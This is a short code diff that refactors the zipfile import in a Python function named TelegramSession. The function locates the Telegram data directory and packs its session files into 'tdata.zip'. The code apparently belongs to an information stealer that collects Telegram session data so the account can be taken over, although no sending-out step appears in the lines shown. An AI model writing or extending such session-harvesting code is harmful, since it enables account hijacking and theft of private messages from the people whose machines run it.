@@ -1,7 +1,7 @@
 # Import modules
 
 import os
-from zipfile import ZIP_DEFLATED, ZipFile
+import zipfile
 
 
 Files = [
@@ -23,7 +23,7 @@ def TelegramSession(Directory, TelegramDir=Scan()):
 	if not os.path.exists(TelegramDir):
 		return None
 
-	with ZipFile(Directory + 'tdata.zip', 'w', ZIP_DEFLATED) as Archive:
+	with zipfile.ZipFile(Directory + 'tdata.zip', 'w', zipfile.ZIP_DEFLATED) as Archive:
 		os.chdir(TelegramDir)
 
 		for File in Files:
